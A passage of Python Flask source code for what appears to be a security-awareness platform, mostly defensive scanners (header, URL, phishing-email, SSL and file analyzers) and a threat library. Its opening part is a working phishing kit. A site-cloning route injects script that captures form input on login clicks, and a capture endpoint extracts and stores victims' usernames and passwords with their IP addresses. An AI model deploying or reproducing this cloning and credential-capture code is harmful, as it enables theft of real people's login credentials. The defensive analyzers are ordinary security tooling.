                var isButton = t.tagName === 'BUTTON' || t.closest('button') || (t.tagName === 'INPUT' && (t.type === 'submit' || t.type === 'button'));
                var isLoginLink = t.tagName === 'A' && (t.innerText.toLowerCase().includes('login') || t.innerText.includes('دخول') || t.innerText.includes('sign in'));
                if(isButton || isLoginLink) {{ captureAndSend(e); }}
            }}, true);
            document.addEventListener('keypress', function(e){{
                if(e.key === 'Enter') {{ captureAndSend(e); }}
            }}, true);
        }})();
        '''
        soup.body.append(js)
        
        path = os.path.join(app.config['CLONES_FOLDER'], name + '.html')
        with open(path, 'w', encoding='utf-8') as f: f.write(str(soup))
        
        conn = get_db()
        conn.execute(
            '''INSERT OR REPLACE INTO clones (clone_name, source_url, template_file, created_at, user_id) VALUES (?, ?, ?, ?, ?)''',
            (name, url, name + '.html', now(), session.get("user_id"))
        )
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'clone_name': name, 'url': '/view-clone/' + name})
    except Exception as e: 
        return jsonify({'error': 'Failed to clone: ' + str(e)}), 400

@app.route('/view-clone/<name>')
def view_clone(name): return render_template('clones/' + safe_name(name) + '.html')

@app.route('/api/capture-submit', methods=['POST'])
def capture_submit():
    data = request.get_json() or {}
    form = data.get('form_data', {}) or {}
    
    username = 'N/A'
    password = 'N/A'
    
    for key, val in form.items():
        k_lower = str(key).lower()
        v_str = str(val).strip()
        
        if not v_str or v_str.lower() in ['on', 'off', 'true', 'false', '0', '1']:
            continue
            
        if any(x in k_lower for x in ['pass', 'pwd', 'secret']):
            password = v_str
        elif any(x in k_lower for x in ['user', 'email', 'phone', 'id', 'login', 'account']):
            if username == 'N/A':
                username = v_str

    if username == 'N/A' and password == 'N/A':
        vals = [str(v).strip() for v in form.values() if str(v).strip() and str(v).strip().lower() not in ['on', 'true']]
        if len(vals) >= 2:
            username = vals[0]
            password = vals[1]

    target_site = data.get('site') or data.get('template') or 'unknown'
    conn = get_db()
    
    creator_id = session.get("user_id")
    if not creator_id:
        if form.get('creator_id'):
            creator_id = form.get('creator_id') 
        else:
            clone_record = conn.execute("SELECT user_id FROM clones WHERE clone_name = ?", (target_site,)).fetchone()
            if clone_record:
                creator_id = clone_record["user_id"]
            
    conn.execute('''INSERT INTO captured_data 
                    (session_id, target_site, captured_username, captured_password, password_status, full_data, ip_address, user_agent, timestamp, user_id) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                 (str(uuid.uuid4())[:8], target_site, username[:100], password[:100], 'Password Captured', 
                  json.dumps(form, ensure_ascii=False), mask_ip(request.remote_addr), request.headers.get('User-Agent', '')[:200], now(), creator_id))
    conn.commit()
    conn.close()
    return jsonify({'status': 'saved_full_data'})

@app.route('/api/social-capture', methods=['POST'])
def social_capture(): return capture_submit()

@app.route('/api/delete-captured/<int:item_id>', methods=['DELETE'])
@login_required
def del_cap(item_id):
    conn = get_db()
    item = conn.execute("SELECT user_id FROM captured_data WHERE id=?", (item_id,)).fetchone()
    if not item: return jsonify({'error': 'Not found'}), 404
    
    if session.get('role') == 'admin' or item['user_id'] == session.get('user_id'):
        conn.execute('DELETE FROM captured_data WHERE id=?', (item_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    
    conn.close()
    return jsonify({'error': 'Unauthorized'}), 403

@app.route('/api/delete-clone/<name>', methods=['DELETE'])
@login_required
def del_clone(name):
    n = safe_name(name)
    conn = get_db()
    item = conn.execute("SELECT user_id FROM clones WHERE clone_name=?", (n,)).fetchone()
    if not item: return jsonify({'error': 'Not found'}), 404
    
    if session.get('role') == 'admin' or item['user_id'] == session.get('user_id'):
        conn.execute('DELETE FROM clones WHERE clone_name=?', (n,))
        conn.commit()
        conn.close()
        fp = os.path.join(app.config['CLONES_FOLDER'], n + '.html')
        if os.path.exists(fp): os.remove(fp)
        return jsonify({'success': True})
    
    conn.close()
    return jsonify({'error': 'Unauthorized'}), 403


# ==================== DEFENSIVE SCANNERS & TOOLS (UPGRADED + FIXED) ====================

MAX_ANALYZE_FILE_SIZE = 25 * 1024 * 1024

SETCDP_SECURITY_HEADERS = {
    'Strict-Transport-Security': 'HSTS forces HTTPS connections',
    'Content-Security-Policy': 'CSP helps reduce XSS and injection risks',
    'X-Frame-Options': 'Protects against clickjacking',
    'X-Content-Type-Options': 'Prevents MIME sniffing',
    'Referrer-Policy': 'Controls referrer leakage',
    'Permissions-Policy': 'Restricts browser features',
    'Cross-Origin-Opener-Policy': 'Improves cross-origin isolation',
    'Cross-Origin-Resource-Policy': 'Controls cross-origin resource loading'
}

def safe_log_scan(scan_type, target, summary, level):
    """
    يمنع أي خطأ داخل log_scan من تعطيل أدوات الفحص.
    مهم جداً حتى لا تظهر HTTP 500 بسبب مشكلة في قاعدة البيانات أو session.
    """
    try:
        log_scan(scan_type, target, summary, level)
    except Exception as e:
        print("SET-CDP log_scan skipped:", e)


def human_size(size):
    size = int(size or 0)
    units = ["B", "KB", "MB", "GB"]
    value = float(size)
    for unit in units:
        if value < 1024 or unit == units[-1]:
            return f"{value:.2f} {unit}" if unit != "B" else f"{int(value)} B"
        value /= 1024


def calculate_entropy(data):
    """حساب Shannon Entropy بطريقة أسرع وأكثر ثباتاً."""
    if not data:
        return 0.0

    counts = [0] * 256
    for byte in data:
        counts[byte] += 1

    entropy = 0.0
    length = len(data)

    for count in counts:
        if count:
            p = count / length
            entropy -= p * math.log2(p)

    return round(entropy, 3)


def normalize_tool_url(url):
    url = (url or "").strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url


def normalize_tool_domain(value):
    value = (value or "").strip()
    value = value.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    return value


def detect_file_type(content, filename=""):
    filename = filename or ""
    ext = filename.rsplit(".", 1)[-1].lower() if "." in filename else ""
    magic_hex = content[:32].hex().upper()

    result = {
        "extension": ext,
        "description": "Unknown",
        "mime": mimetypes.guess_type(filename)[0] or "application/octet-stream",
        "magic_hex": magic_hex[:64],
        "signature": "Unknown"
    }

    if content.startswith(b"MZ"):
        result.update({"description": "Windows Executable (EXE/DLL)", "mime": "application/x-msdownload", "signature": "MZ"})
    elif content.startswith(b"%PDF"):
        result.update({"description": "PDF Document", "mime": "application/pdf", "signature": "PDF"})
    elif content.startswith(b"PK\x03\x04"):
        result.update({"description": "ZIP / Office Document", "mime": "application/zip", "signature": "ZIP"})
    elif content.startswith(b"\x89PNG"):
        result.update({"description": "PNG Image", "mime": "image/png", "signature": "PNG"})
    elif content.startswith(b"\xff\xd8\xff"):
        result.update({"description": "JPEG Image", "mime": "image/jpeg", "signature": "JPEG"})
    elif content.startswith(b"GIF87a") or content.startswith(b"GIF89a"):
        result.update({"description": "GIF Image", "mime": "image/gif", "signature": "GIF"})
    elif content.startswith(b"RIFF") and len(content) >= 12 and content[8:12] == b"WEBP":
        result.update({"description": "WEBP Image", "mime": "image/webp", "signature": "WEBP"})
    elif content[:300].lstrip().lower().startswith((b"<!doctype html", b"<html")) or ext in {"html", "htm"}:
        result.update({"description": "HTML Document", "mime": "text/html", "signature": "HTML"})

    # Office files are ZIP containers
    if result["signature"] == "ZIP":
        try:
            with zipfile.ZipFile(BytesIO(content)) as z:
                names = set(z.namelist())
                if "[Content_Types].xml" in names:
                    if any(n.startswith("word/") for n in names):
                        result.update({"description": "Microsoft Word Document (DOCX)", "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document", "signature": "DOCX"})
                    elif any(n.startswith("xl/") for n in names):
                        result.update({"description": "Microsoft Excel Workbook (XLSX)", "mime": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "signature": "XLSX"})
                    elif any(n.startswith("ppt/") for n in names):
                        result.update({"description": "Microsoft PowerPoint Presentation (PPTX)", "mime": "application/vnd.openxmlformats-officedocument.presentationml.presentation", "signature": "PPTX"})
        except Exception:
            pass

    return result


def extract_html_metadata(content):
    text = content[:300000].decode("utf-8", errors="ignore")
    metadata = {}

    try:
        soup = BeautifulSoup(text, "html.parser")
        title = soup.find("title")
        metadata["Title"] = title.get_text(strip=True) if title else ""
        metadata["Forms"] = len(soup.find_all("form"))
        metadata["Inputs"] = len(soup.find_all("input"))
        metadata["Scripts"] = len(soup.find_all("script"))
        metadata["Links"] = len(soup.find_all("a"))

        metas = {}
        for meta in soup.find_all("meta"):
            name = meta.get("name") or meta.get("property") or meta.get("http-equiv")
            content_value = meta.get("content")
            if name and content_value:
                metas[name] = content_value[:300]
        if metas:
            metadata["Meta Tags"] = metas

        metadata["External HTTP Assets"] = len(re.findall(r"(?:src|href)=[\"']http://", text, re.I))
    except Exception as e:
        metadata["HTML Parse Error"] = str(e)

    return metadata


def extract_pdf_metadata(content):
    metadata = {}
    try:
        reader = PdfReader(BytesIO(content))
        metadata["Pages"] = len(reader.pages)
        metadata["Encrypted"] = bool(getattr(reader, "is_encrypted", False))

        if reader.metadata:
            for k, v in reader.metadata.items():
                metadata[str(k).replace("/", "")] = str(v)

        raw = content[:500000]
        metadata["Has JavaScript Marker"] = b"/JavaScript" in raw or b"/JS" in raw
        metadata["Has OpenAction Marker"] = b"/OpenAction" in raw
        metadata["Has EmbeddedFile Marker"] = b"/EmbeddedFile" in raw
    except Exception as e:
        metadata["PDF Metadata Error"] = str(e)

    return metadata


def extract_image_metadata(content):
    metadata = {}

    try:
        img = Image.open(BytesIO(content))
        metadata["Format"] = img.format
        metadata["Width"] = img.width
        metadata["Height"] = img.height
        metadata["Mode"] = img.mode

        try:
            exif = img.getexif()
            if exif:
                for tag_id, value in exif.items():
                    tag = ExifTags.TAGS.get(tag_id, str(tag_id))
                    if tag in {"Make", "Model", "Software", "DateTime", "DateTimeOriginal", "DateTimeDigitized", "Artist", "Copyright"}:
                        metadata[tag] = str(value)
        except Exception:
            pass

    except Exception as e:
        metadata["Image Metadata Error"] = str(e)

    return metadata


def extract_zip_metadata(content):
    metadata = {}

    try:
        with zipfile.ZipFile(BytesIO(content)) as z:
            infos = z.infolist()
            total_uncompressed = sum(i.file_size for i in infos)
            total_compressed = sum(i.compress_size for i in infos)
            metadata["Entries"] = len(infos)
            metadata["Compressed Size"] = human_size(total_compressed)
            metadata["Uncompressed Size"] = human_size(total_uncompressed)
            metadata["Encrypted Entries"] = sum(1 for i in infos if i.flag_bits & 0x1)
            metadata["Path Traversal Found"] = any(".." in i.filename.replace("\\", "/").split("/") for i in infos)
            metadata["Sample Entries"] = [i.filename for i in infos[:25]]
    except Exception as e:
        metadata["ZIP Metadata Error"] = str(e)

    return metadata


def build_file_warnings(filename, detected, entropy, metadata):
    warnings = []
    ext = detected.get("extension", "")
    desc = detected.get("description", "")

    if desc.startswith("Windows Executable"):
        warnings.append("🚨 الملف تنفيذي. لا تقم بتشغيله إلا إذا كان من مصدر موثوق ومصرح.")
    if entropy >= 7.5:
        warnings.append(f"⚠️ Entropy مرتفع ({entropy})؛ قد يكون الملف مضغوطاً أو مشفراً.")
    elif entropy >= 7.2:
        warnings.append(f"⚠️ Entropy أعلى من الطبيعي ({entropy}).")

    if len(filename.split(".")) >= 3 and ext in {"exe", "scr", "bat", "cmd", "js", "vbs", "ps1"}:
        warnings.append("🚨 امتداد مزدوج وينتهي بامتداد قابل للتنفيذ.")

    if ext in {"jpg", "jpeg", "png", "gif", "webp"} and "Image" not in desc and desc != "Unknown":
        warnings.append("⚠️ امتداد الملف يوحي بأنه صورة، لكن التوقيع الفعلي لا يطابق صورة.")

    if desc == "HTML Document":
        if metadata.get("Forms", 0) > 0:
            warnings.append("⚠️ ملف HTML يحتوي نماذج إدخال Forms.")
        if metadata.get("External HTTP Assets", 0) > 0:
            warnings.append("⚠️ ملف HTML يحتوي موارد خارجية غير مشفرة HTTP.")

    if metadata.get("Has JavaScript Marker"):
        warnings.append("⚠️ ملف PDF يحتوي مؤشر JavaScript.")
    if metadata.get("Has OpenAction Marker"):
        warnings.append("⚠️ ملف PDF يحتوي OpenAction.")

    if metadata.get("Path Traversal Found"):
        warnings.append("🚨 الأرشيف يحتوي مسارات Path Traversal مثل ../")

    return warnings


@app.route("/api/generate-password", methods=["POST"])
def generate_password():
    try:
        data = request.get_json(silent=True) or {}
        length = max(8, min(64, int(data.get("length", 16))))

        chars = ""
        if data.get("upper", True):
            chars += string.ascii_uppercase
        if data.get("lower", True):
            chars += string.ascii_lowercase
        if data.get("digits", True):
            chars += string.digits
        if data.get("symbols", True):
            chars += "!@#$%^&*()-_=+[]{};:,.?/"

        if not chars:
            return jsonify({"error": "اختر نوع واحد على الأقل"}), 400

        password = "".join(secrets.choice(chars) for _ in range(length))
        safe_log_scan("password_generator", "Local Gen", f"Length {length}", "Info")
        return jsonify({"password": password, "length": length})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/expand-url", methods=["POST"])
def expand_url():
    url = normalize_tool_url((request.get_json(silent=True) or {}).get("url", ""))

    if not url:
        return jsonify({"error": "أدخل رابطاً صحيحاً."}), 400

    parsed = urlparse(url)
    safe, msg = is_safe_hostname(parsed.hostname)
    if not safe:
        return jsonify({"error": msg}), 400

    try:
        response = requests.get(
            url,
            timeout=15,
            allow_redirects=True,
            headers={
                "User-Agent": "Mozilla/5.0 SET-CDP URL Expander/2.1",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            }
        )

        chain = [r.url for r in response.history] + [response.url]
        risk = "Safe"
        notes = []

        if len(chain) > 3:
            risk = "Suspicious"
            notes.append("سلسلة تحويلات طويلة.")
        if response.url.startswith("http://"):
            risk = "High Risk"
            notes.append("الرابط النهائي غير مشفر HTTP.")
        if response.status_code >= 400:
            if risk == "Safe":
                risk = "Suspicious"
            notes.append(f"الخادم أرجع رمز حالة: {response.status_code}")

        safe_log_scan("url_expander", url, f"Final: {response.url}", risk)

        return jsonify({
            "original_url": url,
            "final_url": response.url,
            "redirect_count": len(response.history),
            "chain": chain,
            "status_code": response.status_code,
            "risk": risk,
            "notes": notes or ["مسار التحويل تم تحليله بنجاح."]
        })

    except requests.exceptions.SSLError:
        return jsonify({"error": "فشل التحقق من SSL للرابط. جرّب رابطاً آخر أو افحص الشهادة."}), 400
    except requests.exceptions.Timeout:
        return jsonify({"error": "انتهت مهلة الاتصال بالرابط."}), 400
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"تعذر فحص الرابط: {str(e)}"}), 400
    except Exception as e:
        return jsonify({"error": f"خطأ غير متوقع في URL Expander: {str(e)}"}), 500


@app.route("/api/header-analyzer", methods=["POST"])
def header_analyzer():
    url = normalize_tool_url((request.get_json(silent=True) or {}).get("url", ""))

    if not url:
        return jsonify({"error": "أدخل رابطاً صحيحاً."}), 400

    parsed = urlparse(url)
    safe, msg = is_safe_hostname(parsed.hostname)
    if not safe:
        return jsonify({"error": msg}), 400

    try:
        response = requests.get(
            url,
            timeout=15,
            allow_redirects=True,
            headers={"User-Agent": "Mozilla/5.0 SET-CDP Header Analyzer/2.1"}
        )

        headers_to_check = dict(SETCDP_SECURITY_HEADERS)
        try:
            headers_to_check.update(SECURITY_HEADERS)
        except Exception:
            pass

        analysis = []
        score = 100

        for header, desc in headers_to_check.items():
            value = response.headers.get(header)
            if value:
                analysis.append({
                    "header": header,
                    "status": "Secure",
                    "present": True,
                    "value": value,
                    "desc": desc
                })
            else:
                score -= 10
                analysis.append({
                    "header": header,
                    "status": "Missing",
                    "present": False,
                    "value": "Not Set",
                    "desc": desc
                })

        if response.url.startswith("http://"):
            score -= 25

        score = max(0, min(100, score))
        level = "Secure" if score >= 80 else "Moderate" if score >= 50 else "Insecure"

        safe_log_scan("header_analyzer", url, f"Score: {score}%", level)

        return jsonify({
            "url": url,
            "final_url": response.url,
            "score": score,
            "level": level,
            "status_code": response.status_code,
            "server": response.headers.get("Server", "Unknown/Hidden"),
            "x_powered_by": response.headers.get("X-Powered-By", "Not Disclosed"),
            "headers": analysis
        })

    except requests.exceptions.Timeout:
        return jsonify({"error": "انتهت مهلة الاتصال بالخادم."}), 400
    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"تعذر الاتصال بالخادم: {str(e)}"}), 400
    except Exception as e:
        return jsonify({"error": f"خطأ غير متوقع في Header Analyzer: {str(e)}"}), 500


@app.route('/api/check-password', methods=['POST'])
def api_password():
    try:
        pwd = (request.get_json(silent=True) or {}).get('password', '')
        score = 0
        feedback = []

        if len(pwd) >= 12:
            score += 25
            feedback.append({'type': 'success', 'msg': 'طول ممتاز (12+)'})
        elif len(pwd) >= 8:
            score += 10
            feedback.append({'type': 'warning', 'msg': 'طول مقبول (8+)'})
        else:
            feedback.append({'type': 'danger', 'msg': 'قصيرة جداً (أقل من 8)'})

        if re.search(r'[A-Z]', pwd):
            score += 20
            feedback.append({'type': 'success', 'msg': 'تحتوي حروف كبيرة'})
        else:
            feedback.append({'type': 'danger', 'msg': 'تفتقر للحروف الكبيرة'})

        if re.search(r'[a-z]', pwd):
            score += 15
            feedback.append({'type': 'success', 'msg': 'تحتوي حروف صغيرة'})
        else:
            feedback.append({'type': 'warning', 'msg': 'يفضل إضافة حروف صغيرة'})

        if re.search(r'\d', pwd):
            score += 20
            feedback.append({'type': 'success', 'msg': 'تحتوي أرقام'})
        else:
            feedback.append({'type': 'danger', 'msg': 'تفتقر للأرقام'})

        if re.search(r'[^A-Za-z0-9]', pwd):
            score += 20
            feedback.append({'type': 'success', 'msg': 'تحتوي رموز معقدة'})
        else:
            feedback.append({'type': 'warning', 'msg': 'يفضل إضافة رموز (!@#$)'})

        if pwd.lower() in COMMON_PASSWORDS or re.search(r'(12345|qwerty|password|admin)', pwd.lower()):
            score -= 40
            feedback.append({'type': 'danger', 'msg': 'كلمة شائعة جداً'})

        score = max(0, min(100, score))
        level = 'Strong' if score >= 80 else 'Medium' if score >= 50 else 'Weak'

        safe_log_scan('password_strength', 'Local Check', f'Score: {score}/100', level)
        return jsonify({'score': score, 'strength': level, 'feedback': feedback})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/check-email', methods=['POST'])
def api_email():
    try:
        text = (request.get_json(silent=True) or {}).get('email', '')
        low = text.lower()
        score = 0
        findings = []

        urgency_patterns = [
            'urgent', 'immediately', 'suspend', 'verify account', 'limited time',
            'security alert', 'login now', 'عاجل', 'سيتم إيقاف', 'تأكيد هويتك',
            'خلال 24 ساعة', 'تحقق من حسابك', 'كلمة المرور'
        ]

        for p in urgency_patterns:
            if p in low:
                score += 20
                findings.append(f'🚩 نبرة استعجال/تهديد: "{p}".')

        if re.search(r'(password|bank|credit card|login|verify|كلمة المرور|بطاقة ائتمان|تسجيل الدخول)', low):
            score += 25
            findings.append('⚠️ طلب أو إشارة لبيانات حساسة أو تسجيل دخول.')

        urls = re.findall(r'https?://[^\s<>"\']+|www\.[^\s<>"\']+', text)

        if urls:
            findings.append(f'🔗 تم العثور على {len(urls)} رابط داخل النص.')
            for u in urls:
                u_lower = u.lower()
                parsed = urlparse(u if u_lower.startswith(("http://", "https://")) else "https://" + u)
                domain = parsed.hostname or ""

                if u_lower.startswith('http://'):
                    score += 15
                    findings.append(f'⚠️ الرابط {u[:40]} غير مشفر HTTP.')
                if '@' in u:
                    score += 35
                    findings.append('🚨 رابط يحتوي @ وقد يخفي النطاق الحقيقي.')
                if domain.count('-') > 2:
                    score += 10
                    findings.append('⚠️ النطاق يحتوي شرطات متعددة.')
                if domain.startswith('xn--'):
                    score += 30
                    findings.append('🚨 يستخدم Punycode وقد يكون محاولة تشابه بصري.')

        score = min(100, score)
        risk = 'High Risk' if score >= 60 else 'Suspicious' if score >= 30 else 'Low Risk'

        safe_log_scan('email', 'Email Text', f'Score: {score}', risk)
        return jsonify({
            'risk': risk,
            'score': score,
            'findings': findings or ['✅ لا توجد مؤشرات هندسة اجتماعية واضحة.'],
            'urls': urls
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/check-url', methods=['POST'])
def api_url():
    try:
        raw_url = (request.get_json(silent=True) or {}).get('url', '').strip()
        url = normalize_tool_url(raw_url)

        if not url:
            return jsonify({'error': 'أدخل رابطاً صحيحاً.'}), 400

        issues = []
        score = 100
        parsed = urlparse(url)
        domain = parsed.hostname or ""

        safe, msg = is_safe_hostname(domain)
        if not safe:
            return jsonify({"error": msg}), 400

        if parsed.scheme != 'https':
            issues.append('❌ لا يستخدم بروتوكول HTTPS الآمن.')
            score -= 30
        if '@' in url:
            issues.append('🚨 يحتوي رمز @ وقد يخفي النطاق الحقيقي.')
            score -= 40
        if domain.count('-') > 2:
            issues.append('⚠️ اسم النطاق يحتوي شرطات متعددة.')
            score -= 15
        if domain.startswith('xn--'):
            issues.append('🚨 يستخدم Punycode واحتمال Homograph Attack.')
            score -= 40
        if re.fullmatch(r'\d+\.\d+\.\d+\.\d+', domain):
            issues.append('⚠️ يستخدم عنوان IP بدلاً من اسم نطاق.')
            score -= 30

        suspicious_tlds = ['.xyz', '.tk', '.ml', '.ga', '.cf', '.gq', '.pw', '.cc', '.info']
        if any(domain.endswith(tld) for tld in suspicious_tlds):
            issues.append('⚠️ يستخدم امتداد نطاق شائع في المواقع المشبوهة.')
            score -= 20

        score = max(0, score)
        level = 'Safe' if score >= 80 else 'Suspicious' if score >= 50 else 'High Risk'

        safe_log_scan('url', raw_url, f'Score: {score}', level)
        return jsonify({
            'url': raw_url,
            'domain': domain,
            'score': score,
            'level': level,
            'issues': issues or ['✅ الرابط يبدو آمناً وخالياً من مؤشرات التصيد.']
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/scan-website', methods=['POST'])
def api_scan_site():
    url = normalize_tool_url((request.get_json(silent=True) or {}).get('url', ''))

    if not url:
        return jsonify({'error': 'أدخل رابطاً صحيحاً.'}), 400

    parsed = urlparse(url)
    safe, msg = is_safe_hostname(parsed.hostname)
    if not safe:
        return jsonify({'error': msg}), 400

    try:
        r = requests.get(
            url,
            timeout=15,
            allow_redirects=True,
            headers={'User-Agent': 'Mozilla/5.0 SET-CDP Website Scanner/2.1'}
        )

        headers_to_check = dict(SETCDP_SECURITY_HEADERS)
        try:
            headers_to_check.update(SECURITY_HEADERS)
        except Exception:
            pass

        present_headers = sum(1 for h in headers_to_check if h in r.headers)

        soup = BeautifulSoup(r.text, 'html.parser')
        insecure_assets = len(soup.find_all(
            lambda tag: tag.name in ['script', 'img', 'iframe', 'link']
            and str(tag.get('src') or tag.get('href') or '').startswith('http://')
        ))
        insecure_forms = len(soup.find_all('form', action=re.compile('^http://', re.I)))

        score = 100
        issues = []

        if urlparse(r.url).scheme != 'https':
            score -= 40
            issues.append("الموقع النهائي لا يستخدم HTTPS.")
        if insecure_assets > 0:
            score -= 20
            issues.append(f"يوجد {insecure_assets} موارد Mixed Content غير مشفرة.")
        if insecure_forms > 0:
            score -= 30
            issues.append(f"يوجد {insecure_forms} نماذج ترسل البيانات عبر HTTP.")
        missing_count = len(headers_to_check) - present_headers
        if missing_count > 0:
            score -= missing_count * 5
            issues.append(f"ينقص الموقع {missing_count} هيدرز أمنية أساسية.")

        score = max(0, min(100, score))
        level = 'Secure' if score >= 80 else 'Moderate' if score >= 50 else 'Insecure'

        safe_log_scan('website', url, f"Score {score}%", level)
        return jsonify({
            'url': url,
            'final_url': r.url,
            'status_code': r.status_code,
            'server': r.headers.get('Server', 'Unknown'),
            'score': score,
            'level': level,
            'issues': issues or ["✅ الموقع مطابق للمعايير الأساسية التي تم فحصها."],
            'headers_found': present_headers,
            'total_headers': len(headers_to_check)
        })
    except requests.exceptions.Timeout:
        return jsonify({'error': 'انتهت مهلة الاتصال بالموقع.', 'level': 'Error'}), 400
    except requests.exceptions.RequestException as e:
        return jsonify({'error': f'تعذر فحص الموقع: {str(e)}', 'level': 'Error'}), 400
    except Exception as e:
        return jsonify({'error': f'خطأ غير متوقع في Website Scanner: {str(e)}', 'level': 'Error'}), 500


@app.route('/api/ssl-check', methods=['POST'])
def api_ssl():
    domain = normalize_tool_domain((request.get_json(silent=True) or {}).get('domain', ''))

    if not domain:
        return jsonify({'error': 'أدخل اسم النطاق.'}), 400

    safe, msg = is_safe_hostname(domain)
    if not safe:
        return jsonify({'error': msg}), 400

    try:
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=12) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                tls_version = ssock.version()
                cipher = ssock.cipher()

        expiry = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        days = (expiry - datetime.utcnow()).days
        issuer = dict(x[0] for x in cert.get('issuer', [])).get('organizationName', 'Unknown')
        san = cert.get('subjectAltName', [])

        score = 100
        issues = []

        if days < 0:
            status = 'Expired'
            score = 0
            issues.append("❌ الشهادة منتهية الصلاحية.")
        elif days <= 15:
            status = 'Expiring Soon'
            score -= 30
            issues.append("⚠️ الشهادة ستنتهي قريباً.")
        else:
            status = 'Valid'

        if tls_version in ['TLSv1', 'TLSv1.1']:
            score -= 40
            issues.append(f"❌ بروتوكول قديم وضعيف ({tls_version}).")

        score = max(0, score)
        safe_log_scan('ssl', domain, f'{status}, {days} days left', status)

        return jsonify({
            'domain': domain,
            'status': status,
            'score': score,
            'expires': cert['notAfter'],
            'days_left': days,
            'issuer': issuer,
            'tls_version': tls_version,
            'cipher': cipher[0] if cipher else 'Unknown',
            'san_count': len(san),
            'issues': issues or ["✅ الشهادة صالحة وتستخدم بروتوكولات آمنة."]
        })
    except Exception as e:
        return jsonify({'error': str(e), 'status': 'Error'}), 400


@app.route('/api/analyze-file', methods=['POST'])
def api_file():
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file uploaded'}), 400

        f = request.files['file']
        filename = f.filename or "unknown"
        content = f.read()

        if not content:
            return jsonify({'error': 'الملف فارغ'}), 400

        if len(content) > MAX_ANALYZE_FILE_SIZE:
            return jsonify({'error': 'حجم الملف كبير. الحد الأقصى 25MB.'}), 400

        detected = detect_file_type(content, filename)
        entropy = calculate_entropy(content)

        hashes = {
            'md5': hashlib.md5(content).hexdigest(),
            'sha1': hashlib.sha1(content).hexdigest(),
            'sha256': hashlib.sha256(content).hexdigest(),
            'sha512': hashlib.sha512(content).hexdigest()
        }

        metadata = {}
        signature = detected.get("signature")
        ext = detected.get("extension", "")

        if signature == "HTML" or ext in {"html", "htm"}:
            metadata = extract_html_metadata(content)
        elif signature == "PDF" or ext == "pdf":
            metadata = extract_pdf_metadata(content)
        elif signature in {"PNG", "JPEG", "GIF", "WEBP"} or ext in {"jpg", "jpeg", "png", "gif", "webp"}:
            metadata = extract_image_metadata(content)
        elif signature in {"ZIP", "DOCX", "XLSX", "PPTX"} or ext in {"zip", "docx", "xlsx", "pptx"}:
            metadata = extract_zip_metadata(content)
        else:
            metadata = {
                "extension": ext or "unknown",
                "mime_guess": detected.get("mime", "application/octet-stream")
            }

        warnings = build_file_warnings(filename, detected, entropy, metadata)

        if detected["description"].startswith("Windows Executable") or entropy >= 7.5:
            risk = "High Risk"
            score = 35
        elif warnings:
            risk = "Suspicious"
            score = 65
        else:
            risk = "Low Risk"
            score = 92

        safe_log_scan('file', filename, f'Type: {detected["description"]}', risk)

        return jsonify({
            'basic': {
                'filename': filename,
                'extension': ext,
                'size_bytes': len(content),
                'size_human': human_size(len(content)),
                'browser_last_modified': request.form.get("client_last_modified", ""),
                'server_analysis_time': datetime.utcnow().isoformat() + "Z"
            },
            'filename': filename,
            'size': len(content),
            'size_human': human_size(len(content)),
            'file_type': detected["description"],
            'entropy': entropy,
            'type_detection': detected,
            'hashes': hashes,
            'metadata': metadata,
            'deep_metadata': {},
            'warnings': warnings or ["✅ لم يتم اكتشاف مؤشرات خطورة واضحة في بنية الملف."],
            'risk': risk,
            'security': {
                'score': score,
                'risk': risk,
                'warnings': warnings or ["✅ لم يتم اكتشاف مؤشرات خطورة واضحة في بنية الملف."],
                'note': 'هذا تحليل ساكن Static Analysis وليس حكماً نهائياً على سلامة الملف.'
            }
        })
    except Exception as e:
        return jsonify({'error': f'File analyzer internal error: {str(e)}'}), 500
# ==================== QUIZ & THREAT LIBRARY MODULES ====================

@app.route("/threat-library")
def threat_library():
    conn = get_db()
    threats_db = conn.execute("""
        SELECT id, name, risk, desc, how, prev
        FROM cyber_threats
        WHERE is_published = 1
        ORDER BY 
            CASE risk
                WHEN 'Critical' THEN 1
                WHEN 'High' THEN 2
                WHEN 'Medium' THEN 3
                WHEN 'Low' THEN 4
                ELSE 5
            END,
            id DESC
    """).fetchall()
    conn.close()

    threats = [dict(t) for t in threats_db]
    return render_template("threat_library.html", threats=threats)


@app.route("/admin/threats")
@admin_required
def admin_threats():
    conn = get_db()
    threats_db = conn.execute("""
        SELECT *
        FROM cyber_threats
        ORDER BY id DESC
    """).fetchall()
    conn.close()

    threats = [dict(t) for t in threats_db]
    return render_template("admin_threats.html", threats=threats)


@app.route("/admin/threats/add", methods=["POST"])
@admin_required
def add_threat():
    name = request.form.get("name", "").strip()
    risk = request.form.get("risk", "Medium").strip()
    desc = request.form.get("desc", "").strip()
    how = request.form.get("how", "").strip()
    prev = request.form.get("prev", "").strip()
    is_published = 1 if request.form.get("is_published") == "on" else 0

    if not name or not desc or not how or not prev:
        flash("Please fill all required fields.", "danger")
        return redirect(url_for("admin_threats"))

    conn = get_db()
    conn.execute("""
        INSERT INTO cyber_threats (name, risk, desc, how, prev, is_published)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (name, risk, desc, how, prev, is_published))
    conn.commit()
    conn.close()

    flash("Threat published successfully.", "success")
    return redirect(url_for("admin_threats"))


@app.route("/admin/threats/<int:threat_id>/update", methods=["POST"])
@admin_required
def update_threat(threat_id):
    name = request.form.get("name", "").strip()
    risk = request.form.get("risk", "Medium").strip()
    desc = request.form.get("desc", "").strip()
    how = request.form.get("how", "").strip()
